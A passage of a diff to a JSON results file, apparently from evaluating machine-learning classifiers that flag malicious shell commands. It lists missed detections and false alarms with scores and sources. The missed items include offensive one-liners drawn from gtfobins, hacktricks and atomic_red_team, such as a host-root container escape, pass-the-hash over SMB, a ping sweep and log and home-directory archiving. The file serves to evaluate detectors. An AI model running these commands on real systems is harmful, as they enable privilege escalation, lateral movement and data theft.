@@ -1,407 +1,813 @@
 {
-  "xgboost_hybrid/dataset1": {
+  "xgboost/dataset1": {
     "false_negatives": [
       {
         "command": "bconsole",
-        "score": 0.1632271409034729,
+        "score": 0.020480958744883537,
         "source": "gtfobins"
       },
       {
+        "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done",
+        "score": 0.34851396083831787,
+        "source": "atomic_red_team"
+      },
+      {
         "command": "mount | grep cgroup",
-        "score": 0.45884811878204346,
+        "score": 0.3768445551395416,
+        "source": "hacktricks"
+      },
+      {
+        "command": "restic --password-command='/path/to/command' backup",
+        "score": 0.14373642206192017,
+        "source": "gtfobins"
+      },
+      {
+        "command": "nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H \"HashPlaceholder\" -d \"YourDOMAIN\"",
+        "score": 0.3599315285682678,
         "source": "hacktricks"
       },
       {
         "command": "yarn --cwd .",
-        "score": 0.4176328182220459,
+        "score": 0.36625564098358154,
         "source": "gtfobins"
       },
       {
+        "command": "get_version \"/\\S+/srm/bin/vmware-dr($|\\s)\" --version",
+        "score": 0.24466747045516968,
+        "source": "hacktricks"
+      },
+      {
+        "command": "cap_net_raw user1",
+        "score": 0.02278102934360504,
+        "source": "hacktricks"
+      },
+      {
         "command": "aptitude changelog aptitude",
-        "score": 0.0066017345525324345,
+        "score": 0.010714147239923477,
         "source": "gtfobins"
       },
       {
         "command": "rm $1*.bin",
-        "score": 0.35076475143432617,
+        "score": 0.33793210983276367,
+        "source": "hacktricks"
+      },
+      {
+        "command": "sudo busctl capture > system-bus.pcapng",
+        "score": 0.01653173565864563,
         "source": "hacktricks"
       },
       {
         "command": "Label=unconfined",
-        "score": 0.12302791327238083,
+        "score": 0.0436050221323967,
         "source": "hacktricks"
       },
       {
-        "command": "zip $HOME/data.zip /var/log/{w,b}tmp",
-        "score": 0.44676563143730164,
+        "command": "dd if=file.bin bs=28 skip=1 of=blob",
+        "score": 0.45468494296073914,
+        "source": "hacktricks"
+      },
+      {
+        "command": "docker run --rm -it --security-opt seccomp=/path/to/profile.json busybox chmod 400 /etc/hosts",
+        "score": 0.09352599084377289,
+        "source": "hacktricks"
+      },
+      {
+        "command": "halt -p",
+        "score": 0.4393349885940552,
         "source": "atomic_red_team"
       },
       {
+        "command": "sudo pkill -SIGTERM ^cron$",
+        "score": 0.10214497894048691,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "zip $HOME/data.zip /var/log/{w,b}tmp",
+        "score": 0.1785488724708557,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "tshark -Xlua_script:/path/to/temp-file",
+        "score": 0.30121463537216187,
+        "source": "gtfobins"
+      },
+      {
         "command": "Slice=system.slice",
-        "score": 0.23697324097156525,
+        "score": 0.11530428379774094,
         "source": "hacktricks"
       },
       {
         "command": "useradd -u 1000 standarduser",
-        "score": 0.11497869342565536,
+        "score": 0.10013306885957718,
         "source": "hacktricks"
       },
       {
         "command": "pip install --break-system-packages .",
-        "score": 0.15261141955852509,
+        "score": 0.14233364164829254,
         "source": "gtfobins"
       },
       {
         "command": "echo AC_INIT >configure.ac",
-        "score": 0.08898602426052094,
+        "score": 0.048707906156778336,
+        "source": "gtfobins"
+      },
+      {
+        "command": "echo DATA >output-file",
+        "score": 0.0717739537358284,
         "source": "gtfobins"
       },
       {
         "command": "findmnt -t nfs",
-        "score": 0.043815597891807556,
+        "score": 0.029850630089640617,
         "source": "atomic_red_team"
       },
       {
-        "command": "kldstat",
-        "score": 0.33437150716781616,
-        "source": "atomic_red_team"
+        "command": "tcsh -b",
+        "score": 0.4393349885940552,
+        "source": "gtfobins"
       },
       {
-        "command": "./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name",
-        "score": 0.08042293041944504,
+        "command": "cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config",
+        "score": 0.3258264660835266,
         "source": "hacktricks"
       },
       {
-        "command": "locate *",
-        "score": 0.3045734167098999,
-        "source": "atomic_red_team"
+        "command": "end;",
+        "score": 0.40313875675201416,
+        "source": "gtfobins"
       },
       {
         "command": "ps $TARGETPID",
-        "score": 0.28403347730636597,
+        "score": 0.4547608196735382,
         "source": "atomic_red_team"
       },
       {
         "command": "smbserver.py -smb2support share .",
-        "score": 0.4679218828678131,
+        "score": 0.030203381553292274,
+        "source": "gtfobins"
+      },
+      {
+        "command": "touch ./etc/pacman.conf",
+        "score": 0.28098803758621216,
         "source": "gtfobins"
       },
       {
         "command": "docker scan hello-world",
-        "score": 0.028986459597945213,
+        "score": 0.0647345632314682,
         "source": "hacktricks"
+      },
+      {
+        "command": "mount | grep shm",
+        "score": 0.2969207763671875,
+        "source": "hacktricks"
+      },
+      {
+        "command": "ginsh",
+        "score": 0.4445517957210541,
+        "source": "gtfobins"
       },
       {
         "command": "sudo nft list chains",
-        "score": 0.13271886110305786,
+        "score": 0.13480935990810394,
         "source": "hacktricks"
       },
       {
+        "command": "ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x",
+        "score": 0.31014057993888855,
+        "source": "gtfobins"
+      },
+      {
         "command": "apt-get changelog apt",
-        "score": 0.021380243822932243,
+        "score": 0.1742544323205948,
         "source": "gtfobins"
       },
       {
         "command": "aa-status",
-        "score": 0.47878363728523254,
+        "score": 0.10584627836942673,
+        "source": "hacktricks"
+      },
+      {
+        "command": "secure-keep-caps: no (unlocked)",
+        "score": 0.38208624720573425,
         "source": "hacktricks"
       },
       {
         "command": "journalctl -b -1 -p err -o short-iso",
-        "score": 0.1285545974969864,
+        "score": 0.39462044835090637,
         "source": "hacktricks"
       },
       {
-        "command": "mount | head",
-        "score": 0.3352915942668915,
-        "source": "hacktricks"
-      },
-      {
-        "command": "source f*",
-        "score": 0.20375871658325195,
-        "source": "hacktricks"
-      },
-      {
-        "command": "declare builtins",
-        "score": 0.33034631609916687,
-        "source": "hacktricks"
-      },
-      {
-        "command": "pry",
-        "score": 0.35303759574890137,
-        "source": "gtfobins"
-      },
-      {
-        "command": "env | grep -E '^LD_'",
-        "score": 0.2754177153110504,
-        "source": "hacktricks"
-      },
-      {
-        "command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME",
-        "score": 0.025702420622110367,
-        "source": "atomic_red_team"
-      },
-      {
-        "command": "gcc pwn.c -o a.out",
-        "score": 0.33414551615715027,
-        "source": "hacktricks"
-      },
-      {
-        "command": "wine exe2bat.exe nc.exe nc.txt",
-        "score": 0.09569600224494934,
-        "source": "hacktricks"
-      },
-      {
-        "command": "sudo chattr -i file.txt",
-        "score": 0.38878312706947327,
-        "source": "hacktricks"
-      },
-      {
-        "command": "cont",
-        "score": 0.36553114652633667,
-        "source": "gtfobins"
-      },
-      {
-        "command": "sudo nft list tables",
-        "score": 0.28408193588256836,
-        "source": "hacktricks"
-      },
-      {
-        "command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"",
-        "score": 0.44344356656074524,
-        "source": "atomic_red_team"
-      },
-      {
-        "command": "rsync -a *.sh rsync://host.back/src/rbd",
-        "score": 0.4819165766239166,
-        "source": "hacktricks"
-      },
-      {
-        "command": "hping3 --icmp --listen xxx --dump",
-        "score": 0.3754262924194336,
-        "source": "gtfobins"
-      },
-      {
-        "command": "{cat,lol.txt}",
-        "score": 0.44748979806900024,
-        "source": "hacktricks"
-      },
-      {
-        "command": "docker build --secret id=my_key,src=path/to/my_secret_file .",
-        "score": 0.1938573718070984,
-        "source": "hacktricks"
-      },
-      {
-        "command": "wireshark",
-        "score": 0.2912924587726593,
-        "source": "gtfobins"
-      },
-      {
-        "command": "tail",
-        "score": 0.3322165012359619,
+        "command": "mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc",
+        "score": 0.4432833790779114,
         "source": "hacktricks"
       }
     ],
     "false_positives": [
       {
         "command": "unset -f ls /bin/ls",
-        "score": 0.7924138307571411,
+        "score": 0.6333227157592773,
         "source": "nl2bash"
       },
       {
-        "command": "zeroclaw cron add \"* * * * *\" \"command\"",
-        "score": 0.688309907913208,
-        "source": "tldr"
+        "command": "echo \"step_wise\" | sudo tee /sys/class/thermal/thermal_zone0/policy",
+        "score": 0.6573919057846069,
+        "source": "linlm"
       },
       {
-        "command": "echo \"{:key 'val}\" | bb -I \"(:key (first *input*))\"",
-        "score": 0.6970605850219727,
+        "command": "fluent-bit -c /etc/fluent-bit/fluent-bit.conf",
+        "score": 0.8352294564247131,
+        "source": "linlm"
+      },
+      {
+        "command": "frida-ps",
+        "score": 0.6521252393722534,
         "source": "tldr"
       },
       {
         "command": "mkdir \"${HOME}/.npm-packages\"",
-        "score": 0.5079842209815979,
+        "score": 0.9730728268623352,
         "source": "nl2bash"
+      },
+      {
+        "command": "xfreerdp /v:ip_address /u:username /p:password +clipboard",
+        "score": 0.6120198965072632,
+        "source": "tldr"
       },
       {
         "command": "sqlite3 /var/www/file_hashes.db \"CREATE TABLE IF NOT EXISTS file_hashes(path TEXT PRIMARY KEY, md5 TEXT);\"",
-        "score": 0.7419169545173645,
+        "score": 0.955206036567688,
         "source": "bash6k"
       },
       {
-        "command": "yes '' | ruby -e \"$(curl -fsSL https://h658b4b87.example.net/Homebrew/homebrew/go/install)\"",
-        "score": 0.8207395076751709,
-        "source": "nl2bash"
+        "command": "tika-server",
+        "score": 0.6480192542076111,
+        "source": "linlm"
       },
       {
-        "command": "tika-server",
-        "score": 0.5197028517723083,
+        "command": "element-desktop",
+        "score": 0.6222477555274963,
         "source": "linlm"
       },
       {
         "command": "cat /proc/interrupts",
-        "score": 0.9432018399238586,
+        "score": 0.9506663084030151,
         "source": "linlm"
       },
       {
-        "command": "w -h svc-app",
-        "score": 0.6747303605079651,
-        "source": "bash_instruct"
-      },
-      {
-        "command": "MAX_FILE_SIZE=size_in_megabytes http-server-upload",
-        "score": 0.6284485459327698,
-        "source": "tldr"
-      },
-      {
-        "command": "echo ${filename%.*}",
-        "score": 0.546334445476532,
-        "source": "nl2bash"
-      },
-      {
-        "command": "cat /sys/class/net/eth0/statistics/rx_bytes && cat /sys/class/net/eth0/statistics/tx_bytes",
-        "score": 0.7834103107452393,
+        "command": "head -1 first.csv > merged.csv; tail -n +2 *.csv >> merged.csv",
+        "score": 0.5167580842971802,
         "source": "bash6k"
       },
       {
-        "command": "pvesm [f|free] local:iso/archlinux-2025.08.01-x86_64.iso",
-        "score": 0.7544819712638855,
+        "command": "dumpe2fs -x /dev/sdXN",
+        "score": 0.5035237073898315,
         "source": "tldr"
       },
       {
+        "command": "find /home/mine -iname \"*.png\" -execdir cp {} /home/mine/pngcoppies/copy{} \\;",
+        "score": 0.6505899429321289,
+        "source": "nl2bash"
+      },
+      {
+        "command": "macchina --ascii-artists",
+        "score": 0.5087475776672363,
+        "source": "tldr"
+      },
+      {
+        "command": "grep -c \"failure\" /var/log/*.log",
+        "score": 0.6373671889305115,
+        "source": "bash6k"
+      },
+      {
         "command": "mkdir -p /tmp/project/{src,bin,doc}",
-        "score": 0.9463062882423401,
+        "score": 0.971183717250824,
         "source": "bash6k"
       },
       {
         "command": "cat ~/.ssh/known_hosts",
-        "score": 0.936338484287262,
+        "score": 0.8930332660675049,
         "source": "linlm"
+      },
+      {
+        "command": "hostname -I | cut -f1 -d' '",
+        "score": 0.6352583169937134,
+        "source": "nl2bash"
+      },
+      {
+        "command": "jstack /usr/bin/java file.core",
+        "score": 0.9299613833427429,
+        "source": "tldr"
+      },
+      {
+        "command": "screen -R -O -t mysession -S mysession -f",
+        "score": 0.6170359253883362,
+        "source": "nl2bash"
+      },
+      {
+        "command": "cryfs-unmount path/to/mount_point",
+        "score": 0.6238322854042053,
+        "source": "tldr"
       },
       {
         "command": "if selinuxenabled; then echo \"SELinux is running\"; fi",
-        "score": 0.5105876326560974,
+        "score": 0.6341104507446289,
         "source": "tldr"
       },
       {
-        "command": "echo $-",
-        "score": 0.7862209677696228,
-        "source": "bash6k"
-      },
-      {
-        "command": "while IFS=: read -r user _ _ _ _ home _; do",
-        "score": 0.6300828456878662,
-        "source": "bash6k"
-      },
-      {
-        "command": "local -A variable=([key_a]=item_a [key_b]=item_b [key_c]=item_c)",
-        "score": 0.9197942018508911,
+        "command": "wine reg add 'HKEY_CURRENT_USER\\path\\to\\key' /v value_name /t REG_MULTI_SZ /s # /d 'string1#string2#string3'",
+        "score": 0.9718649983406067,
         "source": "tldr"
       },
       {
-        "command": "say --input-file filename.txt",
-        "score": 0.524602472782135,
-        "source": "tldr"
+        "command": "ls `pwd`/*",
+        "score": 0.8052822351455688,
+        "source": "nl2bash"
       },
       {
-        "command": "head -n 10 /etc/passwd",
-        "score": 0.8052744269371033,
-        "source": "bash6k"
-      },
-      {
-        "command": "cat /sys/class/power_supply/BAT0/status",
-        "score": 0.9428912401199341,
+        "command": "ip -d link show type ipvlan",
+        "score": 0.7527188062667847,
         "source": "linlm"
       },
       {
-        "command": "jwt decode jwt_string",
-        "score": 0.5713383555412292,
+        "command": "sudo systemctl set-environment http_proxy=http://h51a737c8.example.net",
+        "score": 0.51917964220047,
+        "source": "linlm"
+      },
+      {
+        "command": "$(dirname $0)",
+        "score": 0.8838191032409668,
+        "source": "nl2bash"
+      },
+      {
+        "command": "create function func_name as path.to.package.Func using 'package.jar';",
+        "score": 0.6264010667800903,
+        "source": "tldr"
+      },
+      {
+        "command": "curl -o page.html https://h0caaf24a.example.net",
+        "score": 0.8217300176620483,
+        "source": "bash6k"
+      },
+      {
+        "command": "tod task list --scheduled --project work",
+        "score": 0.5140698552131653,
+        "source": "tldr"
+      },
+      {
+        "command": "cat /sys/class/power_supply/BAT0/status",
+        "score": 0.9265683889389038,
+        "source": "linlm"
+      },
+      {
+        "command": "ps aux | grep [g]unicorn",
+        "score": 0.5951228141784668,
+        "source": "bash_instruct"
+      },
+      {
+        "command": "grafana cli plugins install plugin_id1 plugin_id2 ...",
+        "score": 0.5630483627319336,
         "source": "tldr"
       },
       {
         "command": "c99 -c file.c",
-        "score": 0.7348241209983826,
+        "score": 0.6525695323944092,
         "source": "tldr"
       },
       {
+        "command": "aws dynamodb put-item --table-name table_name --item '{\"AttributeName\": {\"S\": \"value\"\\}\\}'",
+        "score": 0.5340421199798584,
+        "source": "tldr"
+      },
+      {
+        "command": "zsh [-n|--no-exec] path/to/script.zsh",
+        "score": 0.8820860981941223,
+        "source": "tldr"
+      },
+      {
+        "command": "find /usr/share/man/ -regex grep.*",
+        "score": 0.5360984802246094,
+        "source": "nl2bash"
+      },
+      {
+        "command": "find /target/path -type f -exec your_command_here \\{\\} \\;",
+        "score": 0.5991882085800171,
+        "source": "nl2bash"
+      },
+      {
         "command": "jobs %job_id",
-        "score": 0.6097190976142883,
+        "score": 0.5910519361495972,
         "source": "tldr"
       },
       {
         "command": "eget https://h56aef353.example.net/dl/go1.17.5.linux-amd64.tar.gz",
-        "score": 0.613169252872467,
+        "score": 0.9699124693870544,
+        "source": "tldr"
+      }
+    ]
+  },
+  "xgboost_hybrid/dataset1": {
+    "false_negatives": [
+      {
+        "command": "bconsole",
+        "score": 0.18242476880550385,
+        "source": "gtfobins"
+      },
+      {
+        "command": "apparmor_parser",
+        "score": 0.3449375629425049,
+        "source": "hacktricks"
+      },
+      {
+        "command": "[ ! -z \"$COMMAND\" ] && echo VERSIONSTART \"$p\" \"$(\"${COMMAND%%[[:space:]]*}\" $VERSION_OPTION 2>&1)\" VERSIONEND",
+        "score": 0.4373602569103241,
+        "source": "hacktricks"
+      },
+      {
+        "command": "aptitude changelog aptitude",
+        "score": 0.010498146526515484,
+        "source": "gtfobins"
+      },
+      {
+        "command": "rm $1*.bin",
+        "score": 0.38815927505493164,
+        "source": "hacktricks"
+      },
+      {
+        "command": "Label=unconfined",
+        "score": 0.4311378598213196,
+        "source": "hacktricks"
+      },
+      {
+        "command": "sudo pkill -SIGTERM ^cron$",
+        "score": 0.3447975218296051,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "zip $HOME/data.zip /var/log/{w,b}tmp",
+        "score": 0.4305199384689331,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "Slice=system.slice",
+        "score": 0.4129795730113983,
+        "source": "hacktricks"
+      },
+      {
+        "command": "useradd -u 1000 standarduser",
+        "score": 0.07669040560722351,
+        "source": "hacktricks"
+      },
+      {
+        "command": "pip install --break-system-packages .",
+        "score": 0.09519392251968384,
+        "source": "gtfobins"
+      },
+      {
+        "command": "echo AC_INIT >configure.ac",
+        "score": 0.06289079040288925,
+        "source": "gtfobins"
+      },
+      {
+        "command": "findmnt -t nfs",
+        "score": 0.020709926262497902,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "kldstat",
+        "score": 0.4431038498878479,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name",
+        "score": 0.13807937502861023,
+        "source": "hacktricks"
+      },
+      {
+        "command": "locate *",
+        "score": 0.24418140947818756,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "ps $TARGETPID",
+        "score": 0.2668074071407318,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "smbserver.py -smb2support share .",
+        "score": 0.31461280584335327,
+        "source": "gtfobins"
+      },
+      {
+        "command": "touch ./etc/pacman.conf",
+        "score": 0.44611817598342896,
+        "source": "gtfobins"
+      },
+      {
+        "command": "docker scan hello-world",
+        "score": 0.03393636643886566,
+        "source": "hacktricks"
+      },
+      {
+        "command": "mount | grep shm",
+        "score": 0.4776443541049957,
+        "source": "hacktricks"
+      },
+      {
+        "command": "sudo nft list chains",
+        "score": 0.13645608723163605,
+        "source": "hacktricks"
+      },
+      {
+        "command": "apt-get changelog apt",
+        "score": 0.020988119766116142,
+        "source": "gtfobins"
+      },
+      {
+        "command": "aa-status",
+        "score": 0.3757425844669342,
+        "source": "hacktricks"
+      },
+      {
+        "command": "journalctl -b -1 -p err -o short-iso",
+        "score": 0.28543993830680847,
+        "source": "hacktricks"
+      },
+      {
+        "command": "mount | head",
+        "score": 0.36408478021621704,
+        "source": "hacktricks"
+      },
+      {
+        "command": "source f*",
+        "score": 0.2575598359107971,
+        "source": "hacktricks"
+      },
+      {
+        "command": "declare builtins",
+        "score": 0.37541621923446655,
+        "source": "hacktricks"
+      },
+      {
+        "command": "pry",
+        "score": 0.2857957184314728,
+        "source": "gtfobins"
+      },
+      {
+        "command": "env | grep -E '^LD_'",
+        "score": 0.33633193373680115,
+        "source": "hacktricks"
+      },
+      {
+        "command": "tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME",
+        "score": 0.03761275112628937,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "gcc pwn.c -o a.out",
+        "score": 0.337414413690567,
+        "source": "hacktricks"
+      },
+      {
+        "command": "runc -help",
+        "score": 0.2952510416507721,
+        "source": "hacktricks"
+      },
+      {
+        "command": "STRING \"lalalalal\";",
+        "score": 0.3483823835849762,
+        "source": "hacktricks"
+      },
+      {
+        "command": "wine exe2bat.exe nc.exe nc.txt",
+        "score": 0.21080730855464935,
+        "source": "hacktricks"
+      },
+      {
+        "command": "sudo chattr -i file.txt",
+        "score": 0.3408209979534149,
+        "source": "hacktricks"
+      },
+      {
+        "command": "cont",
+        "score": 0.20842388272285461,
+        "source": "gtfobins"
+      },
+      {
+        "command": "sudo nft list tables",
+        "score": 0.2743595540523529,
+        "source": "hacktricks"
+      },
+      {
+        "command": "ip tcp_metrics show |grep --invert-match \"^127\\.\"",
+        "score": 0.24536459147930145,
+        "source": "atomic_red_team"
+      },
+      {
+        "command": "ip netns delete bar",
+        "score": 0.47294434905052185,
+        "source": "gtfobins"
+      }
+    ],
+    "false_positives": [
+      {
+        "command": "unset -f ls /bin/ls",
+        "score": 0.5020512342453003,
+        "source": "nl2bash"
+      },
+      {
+        "command": "zeroclaw cron add \"* * * * *\" \"command\"",
+        "score": 0.8699771761894226,
+        "source": "tldr"
+      },
+      {
+        "command": "fluent-bit -c /etc/fluent-bit/fluent-bit.conf",
+        "score": 0.7536730766296387,
+        "source": "linlm"
+      },
+      {
+        "command": "sqlite3 /var/www/file_hashes.db \"CREATE TABLE IF NOT EXISTS file_hashes(path TEXT PRIMARY KEY, md5 TEXT);\"",
+        "score": 0.6636767387390137,
+        "source": "bash6k"
+      },
+      {
+        "command": "yes '' | ruby -e \"$(curl -fsSL https://h658b4b87.example.net/Homebrew/homebrew/go/install)\"",
+        "score": 0.7647371292114258,
+        "source": "nl2bash"
+      },
+      {
+        "command": "cat /proc/interrupts",
+        "score": 0.9095425605773926,
+        "source": "linlm"
+      },
+      {
+        "command": "head -1 first.csv > merged.csv; tail -n +2 *.csv >> merged.csv",
+        "score": 0.5613932013511658,
+        "source": "bash6k"
+      },
+      {
+        "command": "w -h svc-app",
+        "score": 0.5273410677909851,
+        "source": "bash_instruct"
+      },
+      {
+        "command": "cat /sys/class/net/eth0/statistics/rx_bytes && cat /sys/class/net/eth0/statistics/tx_bytes",
+        "score": 0.8505991697311401,
+        "source": "bash6k"
+      },
+      {
+        "command": "pvesm [f|free] local:iso/archlinux-2025.08.01-x86_64.iso",
+        "score": 0.6686391234397888,
+        "source": "tldr"
+      },
+      {
+        "command": "mkdir -p /tmp/project/{src,bin,doc}",
+        "score": 0.9727606177330017,
+        "source": "bash6k"
+      },
+      {
+        "command": "cat ~/.ssh/known_hosts",
+        "score": 0.6769648194313049,
+        "source": "linlm"
+      },
+      {
+        "command": "jstack /usr/bin/java file.core",
+        "score": 0.5186015367507935,
+        "source": "tldr"
+      },
+      {
+        "command": "if selinuxenabled; then echo \"SELinux is running\"; fi",
+        "score": 0.7838881611824036,
+        "source": "tldr"
+      },
+      {
+        "command": "echo $-",
+        "score": 0.7558104991912842,
+        "source": "bash6k"
+      },
+      {
+        "command": "wine reg add 'HKEY_CURRENT_USER\\path\\to\\key' /v value_name /t REG_MULTI_SZ /s # /d 'string1#string2#string3'",
+        "score": 0.5218150615692139,
+        "source": "tldr"
+      },
+      {
+        "command": "local -A variable=([key_a]=item_a [key_b]=item_b [key_c]=item_c)",
+        "score": 0.770239531993866,
+        "source": "tldr"
+      },
+      {
+        "command": "say --input-file filename.txt",
+        "score": 0.6865987777709961,
+        "source": "tldr"
+      },
+      {
+        "command": "head -n 10 /etc/passwd",
+        "score": 0.877871572971344,
+        "source": "bash6k"
+      },
+      {
+        "command": "yes Yes | ./ittp-update.sh",
+        "score": 0.6376310586929321,
+        "source": "nl2bash"
+      },
+      {
+        "command": "cat /sys/class/power_supply/BAT0/status",
+        "score": 0.9672529697418213,
+        "source": "linlm"
+      },
+      {
+        "command": "c99 -c file.c",
+        "score": 0.7921929359436035,
+        "source": "tldr"
+      },
+      {
+        "command": "jobs %job_id",
+        "score": 0.7318336367607117,
+        "source": "tldr"
+      },
+      {
+        "command": "eget https://h56aef353.example.net/dl/go1.17.5.linux-amd64.tar.gz",
+        "score": 0.7410533428192139,
         "source": "tldr"
       },
       {
         "command": "sudo ln -s /usr/bin/perl /usr/local/bin/perl`echo -e '\\r'`",
-        "score": 0.9069059491157532,
+        "score": 0.9115661382675171,
         "source": "nl2bash"
       },
       {
         "command": "git_latest_hash(){ local repo=\"$1\"; local branch=\"$2\"; local dir=$(mktemp -d); git clone --depth 1 --branch \"$branch\" \"$repo\" \"$dir\" >/dev/null 2>&1 && (cd \"$dir\" && git rev-parse HEAD); rm -rf \"$dir\"; }",
-        "score": 0.7792671322822571,
+        "score": 0.8624246716499329,
         "source": "bash6k"
       },
       {
         "command": "sudo cat /proc/meminfo",
-        "score": 0.7944168448448181,
+        "score": 0.788055956363678,
         "source": "linlm"
       },
       {
         "command": "echo $!",
-        "score": 0.8642367124557495,
-        "source": "bash6k"
-      },
-      {
-        "command": "tempfile=$(mktemp) && echo $tempfile",
-        "score": 0.520611584186554,
+        "score": 0.8404262065887451,
         "source": "bash6k"
       },
       {
         "command": "cat /proc/sys/vm/vfs_cache_pressure",
-        "score": 0.7781939506530762,
+        "score": 0.7204136848449707,
         "source": "linlm"
       },
       {
         "command": "echo ${array_name[@]}",
-        "score": 0.6037600636482239,
+        "score": 0.5641152262687683,
         "source": "tldr"
       },
       {
         "command": "cat /proc/interrupts | grep -i lapic",
-        "score": 0.937366783618927,
+        "score": 0.8134136199951172,
         "source": "linlm"
       },
       {
         "command": "su - joe -c \"/path/to/my_daemon > /some/output/file\" &",
-        "score": 0.8796604871749878,
+        "score": 0.7246317267417908,
         "source": "nl2bash"
       },
       {
-        "command": "bloodhound-python --collectionmethod All --kerberos --domain domain",
-        "score": 0.506580650806427,
-        "source": "tldr"
-      },
-      {
         "command": "df -ih",
-        "score": 0.6918200850486755,
+        "score": 0.7371532320976257,
         "source": "nl2bash"
       },
       {
         "command": "find . -type f -name \"your_pattern\" -exec du -ch {} + 2>/dev/null | grep total$.",
-        "score": 0.9009312987327576,
-        "source": "nl2bash"
-      },
-      {
-        "command": "echo \"$1\" | od -xcb",
-        "score": 0.6719871759414673,
+        "score": 0.7867106199264526,
         "source": "nl2bash"
       },
       {
         "command": "R -e \"install.packages('ggplot2')\"",
-        "score": 0.8005070686340332,
+        "score": 0.5630311369895935,
         "source": "linlm"
+      },
+      {
+        "command": "systemctl bind unit /path/to/host_directory",
+        "score": 0.8993616700172424,
+        "source": "tldr"
+      },
+      {
+        "command": "vzdump --all --mode suspend --mailto root --mailto admin",
+        "score": 0.5699849724769592,
+        "source": "tldr"
+      },
+      {
+        "command": "</>*.pdf",
+        "score": 0.8882313370704651,
+        "source": "tldr"
+      },
+      {
+        "command": "cat /sys/block/sda/queue/scheduler",
+        "score": 0.5958605408668518,
+        "source": "linlm"
+      },
+      {
+        "command": "find ./ -type f | tee /tmp/grep1 /tmp/grep2 >/dev/null",
+        "score": 0.9702383279800415,
+        "source": "nl2bash"
       }
     ]
   },
@@ -409,405 +815,1513 @@
     "false_negatives": [
       {
         "command": "bconsole",
-        "score": 0.14735513925552368,
+        "score": 0.14363054931163788,
         "source": "gtfobins"
       },
       {
         "command": "apparmor_parser",
-        "score": 0.3552394211292267,
+        "score": 0.39339640736579895,
         "source": "hacktricks"
       },
       {
         "command": "yarn --cwd .",
-        "score": 0.24798086285591125,
+        "score": 0.24712608754634857,
         "source": "gtfobins"
       },
       {
         "command": "aptitude changelog aptitude",
-        "score": 0.016042735427618027,
+        "score": 0.014967742376029491,
         "source": "gtfobins"
       },
       {
         "command": "Label=unconfined",
-        "score": 0.44183844327926636,
+        "score": 0.43997663259506226,
         "source": "hacktricks"
       },
       {
         "command": "halt -p",
-        "score": 0.4773527681827545,
+        "score": 0.4815155267715454,
         "source": "atomic_red_team"
       },
       {
         "command": "useradd -u 1000 standarduser",
-        "score": 0.472570538520813,
+        "score": 0.4558914005756378,
         "source": "hacktricks"
       },
       {
         "command": "pip install --break-system-packages .",
-        "score": 0.3151501417160034,
+        "score": 0.32240423560142517,
         "source": "gtfobins"
       },
       {
         "command": "findmnt -t nfs",
-        "score": 0.018066393211483955,
+        "score": 0.019091710448265076,
         "source": "atomic_red_team"
       },
       {
         "command": "kldstat",
-        "score": 0.10973125696182251,
+        "score": 0.10784672945737839,
         "source": "atomic_red_team"
       },
       {
         "command": "./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name",
-        "score": 0.1157149001955986,
+        "score": 0.10099766403436661,
         "source": "hacktricks"
       },
       {
         "command": "cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config",
-        "score": 0.41645005345344543,
+        "score": 0.41938546299934387,
         "source": "hacktricks"
       },
       {
         "command": "locate *",
-        "score": 0.12148666381835938,
+        "score": 0.117013119161129,
         "source": "atomic_red_team"
       },
       {
         "command": "end;",
-        "score": 0.3485502004623413,
+        "score": 0.3638530671596527,
         "source": "gtfobins"
       },
       {
         "command": "smbserver.py -smb2support share .",
-        "score": 0.41207650303840637,
+        "score": 0.3853345811367035,
         "source": "gtfobins"
       },
       {
         "command": "docker scan hello-world",
-        "score": 0.13906247913837433,
+        "score": 0.121072918176651,
         "source": "hacktricks"
       },
       {
         "command": "ginsh",
-        "score": 0.2942765951156616,
+        "score": 0.2984026372432709,
         "source": "gtfobins"
       },
       {
         "command": "sudo nft list chains",
-        "score": 0.033786624670028687,
+        "score": 0.03440701961517334,
         "source": "hacktricks"
       },
       {
         "command": "nmap --script-help \"(default or version) and smb)\"",
-        "score": 0.47590020298957825,
+        "score": 0.45206916332244873,
         "source": "hacktricks"
       },
       {
         "command": "apt-get changelog apt",
-        "score": 0.025630615651607513,
+        "score": 0.025442320853471756,
         "source": "gtfobins"
       },
       {
         "command": "journalctl -b -1 -p err -o short-iso",
-        "score": 0.07681109756231308,
+        "score": 0.0718931332230568,
         "source": "hacktricks"
       },
       {
         "command": "mount | head",
-        "score": 0.4484213590621948,
+        "score": 0.44657784700393677,
         "source": "hacktricks"
       },
       {
         "command": "source f*",
-        "score": 0.30822283029556274,
+        "score": 0.3230397701263428,
         "source": "hacktricks"
       },
       {
         "command": "declare builtins",
-        "score": 0.20957446098327637,
+        "score": 0.19362929463386536,
         "source": "hacktricks"
       },
       {
         "command": "node --inspect --inspect-port=0 app.js",
-        "score": 0.4850366711616516,
+        "score": 0.48016995191574097,
         "source": "hacktricks"
       },
       {
         "command": "uname!-1\\-a",
-        "score": 0.16475121676921844,
+        "score": 0.16324670612812042,
         "source": "hacktricks"
       },
       {
         "command": "pry",
-        "score": 0.07377723604440689,
+        "score": 0.0753823071718216,
         "source": "gtfobins"
       },
       {
         "command": "gcc pwn.c -o a.out",
-        "score": 0.4779374897480011,
+        "score": 0.4692763090133667,
         "source": "hacktricks"
       },
       {
         "command": "wine exe2bat.exe nc.exe nc.txt",
-        "score": 0.12105372548103333,
